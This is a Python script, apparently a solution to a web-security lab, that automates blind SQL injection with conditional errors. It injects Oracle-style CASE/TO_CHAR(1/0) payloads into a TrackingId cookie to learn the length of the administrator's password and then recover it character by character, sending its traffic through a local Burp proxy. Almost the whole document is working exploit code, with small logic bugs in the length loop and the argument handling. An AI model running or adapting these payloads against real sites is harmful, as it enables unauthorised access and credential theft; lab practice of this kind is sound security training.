# Blind SQL injection with conditional errors
# NOTE: You can watch this video if you want to launch attack automatically via Burp's Intruder https://www.youtube.com/watch?v=HjXUtCKm1FM&t=1109

import urllib3
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def exploit_sqli_to_get_password_lenght(url):
    password_length = 0
    for i in range(1,30):
        # Extract password length 
        payload1  = "' AND (SELECT CASE WHEN Length(password) = %i THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') = 'a" %i
        cookies = {
            "TrackingId":"OjbHNAkSZVLEPWFG"+payload1
        }
        req = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        res = req.text
        if "Internal Server Error" in res:
            # Then password lenght is equal to i and we need to break
            password_length = i +1 
            continue
        else:
            return password_length
            
    return False

def exploit_sqli_to_get_admin_password(url, password_lenght):
    
    alphanumeric_list = ['0','1','2','3','4','5','6','7','8','9',
                        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
                        'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                        'u', 'v', 'w', 'x', 'y', 'z']
    admin_password = ""
    for i in range(1,password_length+1):
        # Assuming the password contains only lowercase, alphanumeric characters as the previous lab
        for char in alphanumeric_list:
            payload2 = "' AND (SELECT CASE WHEN SUBSTR(password,%i,1) LIKE '%s' THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') = 'a" %(i,char)
            cookies = {
                # Don't forget to change this cookie according to yours 
                "TrackingId":"OjbHNAkSZVLEPWFG"+payload2
            }
            req = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            res = req.text
            if "Internal Server Error" in res:
                continue
            else:
                admin_password+=char
                break

            
    return admin_password 


if __name__ == '__main__':
    try:

        url = sys.argv[1]
    except:
        print("[-] Usage %s <url>" %sys.argv[0])
        print("[-] Example: %s www.example.com" %sys.argv[0])
    
    print("[+] Figuring out admin password's lenght and password..")
    password_length = exploit_sqli_to_get_password_lenght(url)
    admin_password = exploit_sqli_to_get_admin_password(url, password_length)

    if password_length:
        print("[+] The length of admin's password is %i" %password_length)
    else:
        print("[-] Attack failed to get password length..")
    
    if admin_password:
        print("[+] The password admin is: %s" %admin_password)
    else:
        print("[-] Attack failed to get admin's password..")

    
        